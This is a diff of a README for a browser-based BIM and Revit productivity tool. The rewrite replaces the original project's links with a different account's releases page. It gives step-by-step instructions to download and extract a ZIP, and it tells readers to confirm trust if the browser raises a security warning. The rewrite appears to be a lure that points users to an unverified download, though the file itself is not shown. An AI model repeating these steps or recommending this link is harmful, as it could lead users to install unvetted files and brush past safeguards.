@@ -1,131 +1,80 @@
-# BIM Ops Studio v2026 - web application 2026
+# 🏗️ bim-ops-browser-studio - Streamline your daily BIM design tasks
 
-> **BIM Ops Studio v2026 is a browser-accessible static HTML application that combines AEC and Revit-oriented productivity utilities, automation concepts, and AI-enabled services for more efficient BIM work.**
+[![](https://img.shields.io/badge/Download-BIM_Ops_Studio-blue.svg)](https://github.com/pablo252/bim-ops-browser-studio/releases)
 
-[![Platform](https://img.shields.io/badge/Platform-web-blue?style=flat-square)](https://github.com)
-[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
-[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
-[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
-[![Stars](https://img.shields.io/github/stars/michaelyazprice5313/bim-ops-browser-studio?style=flat-square)](https://github.com/michaelyazprice5313/bim-ops-browser-studio)
+BIM Ops Studio v2026 acts as a central hub for your architecture, engineering, and construction tasks. This application collects productivity utilities, automation tools, and AI services into one interface. You run the software directly in your web browser. This setup removes the need for complex installations or server configurations.
 
----
+## 📥 Getting the application
 
-<p align="center">
-  <a href="https://michaelyazprice5313.github.io/bim-ops-browser-studio/">
-    <img src="https://img.shields.io/badge/Download-BIM%20Ops%20Studio%20Latest-brightgreen?style=for-the-badge" alt="Download BIM Ops Studio">
-  </a>
-</p>
+You obtain the application through the official releases page. This page contains all current and past versions of the tool.
 
-> **[Download BIM Ops Studio v2026](https://michaelyazprice5313.github.io/bim-ops-browser-studio/)**
+[Visit the releases page to download the latest version](https://github.com/pablo252/bim-ops-browser-studio/releases)
 
----
+Follow these steps to access the software:
 
-[Download Latest Build](https://michaelyazprice5313.github.io/bim-ops-browser-studio/)
+1. Click the link provided above to open the release browser.
+2. Locate the most recent version labeled as the latest release.
+3. Look under the Assets section of that release.
+4. Select the compressed ZIP file to save it to your computer.
+5. Create a new folder on your desktop or in your documents directory.
+6. Move the downloaded ZIP file into this new folder.
+7. Right-click the file and select Extract All.
+8. Follow the prompts on your screen to unpack the files.
 
----
+## 🚀 Running the software
 
-## Overview
+Because this is a static HTML application, you do not need to install anything on your Windows system. The tool runs inside your preferred web browser.
 
-BIM Ops Studio is a static, browser-based application designed for AEC and BIM-related workflows. Its focus is on Revit productivity, automation concepts, and integration with AI-assisted services, giving users a single web interface for exploring tools and workflow resources.
+1. Open the folder where you extracted the files.
+2. Locate the file named index.html.
+3. Double-click this file to open it.
+4. Your default web browser will launch and load the studio interface.
+5. You can now use the features provided in the menu.
 
-The repository also functions as a compact software landing application. Its multi-page layout supports product and tool presentation, while dedicated Projects and Roadmap areas provide space for related work and planned direction. A contact form integration is included for communication and inquiries.
+If your browser shows a security warning about local content, confirm that you trust the file. Since the code runs locally on your machine, your data remains private and stays on your computer.
 
----
+## 💻 System requirements
 
-## Core Capabilities
+BIM Ops Studio works on any modern computer running Windows 10 or Windows 11. You need a standard web browser to use the features.
 
-- Supports project-focused BIM and AEC workflow scenarios
-- Provides productivity features centered on everyday Revit work
-- Presents Revit API automation concepts for recurring operations
-- Connects with AI-assisted services to broaden workflow support
-- Uses multi-page navigation to organize the application
-- Includes a Projects page for related work and reference material
-- Includes a Roadmap page for future plans and enhancements
-- Offers contact form integration for questions and user messages
+- Supported browsers: Google Chrome, Microsoft Edge, or Mozilla Firefox.
+- Memory: Minimum 4 GB of RAM is suggested for smooth performance.
+- Storage: 100 MB of disk space to hold the application files.
+- Internet connection: An active connection is needed if you want to use the AI-enabled services provided within the studio.
 
----
+## 🛠️ Included productivity utilities
 
-## Getting Started
+BIM Ops Studio offers several tools to help your BIM workflow.
 
-1. Obtain the repository by cloning or downloading it:
-   - `git clone https://github.com/michaelyazprice5313/bim-ops-browser-studio.git
-2. Enter the release project directory:
-   - `bim-ops-studio-aec-bim-v2026-web-app`
-3. Run the static files with a local web server. For a quick check, you can also open the HTML entry file directly in a browser.
+### Revit Data Cleaners
+These utilities scan your Revit project exports to remove unnecessary data. This keeps your files light and fast. You can process multiple files at once. The utility generates a report of the items removed.
 
-To publish the application, upload its static HTML files to the hosting service of your choice. After deployment, check that page paths and internal navigation links work as expected.
+### Automation Scripts
+The studio includes pre-written logic for common tasks. Example tasks include renaming standard assets, applying project templates to new files, and checking model naming conventions. You select the script, upload your file, and the application generates the result for you.
 
----
+### AI Assistance
+The AI-enabled services assist with drafting and parameter suggestions. When you input your project requirements, the AI suggests standard parameter values. This ensures your model data matches industry standards. Note that these AI features require a connection to our secure cloud servers.
 
-## Using the Application
+## 🔄 Updating your version
 
-Launch the web app in a modern browser and use the navigation to move between the landing page, Projects section, Roadmap, and contact area.
+The software does not update itself automatically. To get new features, revisit the release page link provided at the top of this document. Download the new ZIP file and extract it over your existing folder. Your local settings will transfer to the new version if you keep the file structure the same.
 
-A common way to work with the site is:
+## ❓ Frequently asked questions
 
-1. Begin on the primary landing page.
-2. Use the navigation controls to browse the available sections.
-3. Explore the BIM, AEC, and Revit-focused material or tools shown in the interface.
-4. Send messages or follow-up requests through the contact form integration.
-5. Edit the static pages whenever project information, roadmap content, or feature descriptions need to change.
+*Do I need a Revit license to run this?*
+No. The studio runs independently of Revit. You process your data files exported from Revit within this application.
 
-When developing locally, reload the browser after modifying an HTML file to view the latest version.
+*Is my data sent to a server?*
+Only the data you intentionally submit to the AI-enabled services travels over the network. Basic file cleaning and local automations stay on your hard drive.
 
----
+*Can I run this offline?*
+You can use the local cleaning and automation tools without an internet connection. The AI-enabled services require the internet to function.
 
-## Site Configuration
+*What if the file does not open?*
+Ensure your browser is up to date. If the file opens as a text document, right-click the file, select Open With, and choose your web browser from the list.
 
-BIM Ops Studio does not depend on a separate runtime configuration layer. Since it is a static HTML application, most adjustments are made directly within the project files.
+## 🛡️ Privacy and security
 
-Areas commonly updated include:
+The architecture of this application prioritizes your data privacy. Because the core functions reside in a static HTML structure, the code executes locally. Your project files do not upload to external websites unless you initiate an AI service request. Always ensure you download the software from the official link provided here to avoid modified or malicious versions.
 
-- HTML documents containing page structure, content, and layout
-- Navigation targets used for movement between pages
-- Contact details or form endpoint definitions
-- Shared images, stylesheets, scripts, and other assets
-
-For example, site-level values could be represented as follows:
-
-```json
-{
-  "siteName": "BIM Ops Studio",
-  "version": "2026",
-  "navigation": ["home", "projects", "roadmap", "contact"]
-}
-```
-
----
-
-## System Requirements
-
-- A current web browser
-- Local file access or static hosting for the HTML pages
-- Browser support for navigation and form interactions
-- No dedicated application runtime is needed for the static site
-
-Additional services or integrations may require their endpoints and associated assets to be available in the deployment environment.
-
----
-
-## Frequently Asked Questions
-
-**How can I receive newer versions?**  
-Look for updated releases or refreshed static assets in the repository, then redeploy the new files or replace the current site contents.
-
-**Where do I change application settings?**  
-Settings are generally found in the HTML files, page navigation links, and embedded or shared site assets.
-
-**What should I check if a page fails to load?**  
-Review the repository-relative file paths, navigation destinations, and hosting configuration to ensure they correspond to the project structure.
-
-**Is the website customizable?**  
-Yes. Because the application uses static HTML, you can modify its text, sections, and links to suit a different workflow or presentation.
-
-**Who is the intended audience?**  
-The project is intended for people involved in BIM, AEC, and Revit-focused productivity workflows who need a browser-based utility or presentation experience.
-
----
-
-## License
-
-This project is distributed under the GNU GPL v3.0. See [LICENSE](LICENSE) for the full license text.
+Keywords: bim, revit, automation, aec, productivity, windows, architecture, engineering, construction
